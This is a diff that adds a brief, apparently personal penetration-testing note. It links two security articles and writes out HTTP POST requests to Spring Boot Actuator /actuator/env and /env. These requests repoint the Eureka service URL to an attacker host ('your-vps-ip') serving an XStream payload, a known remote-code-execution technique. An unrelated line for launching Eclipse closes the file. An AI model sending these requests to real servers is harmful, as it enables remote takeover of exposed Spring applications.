@@ -1,0 +1,16 @@
+https://www.jianshu.com/p/91a5ca9b7c1c
+https://www.onebug.org/websafe/98955.html
+/actuator/env
+
+POST /actuator/env
+Content-Type: application/json
+
+{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/xstream"}
+
+POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip:2222/xstream
+
+
+java -jar org.eclipse.equinox.launcher_1.5.0.v20180512-1130.jar 启动eclipse
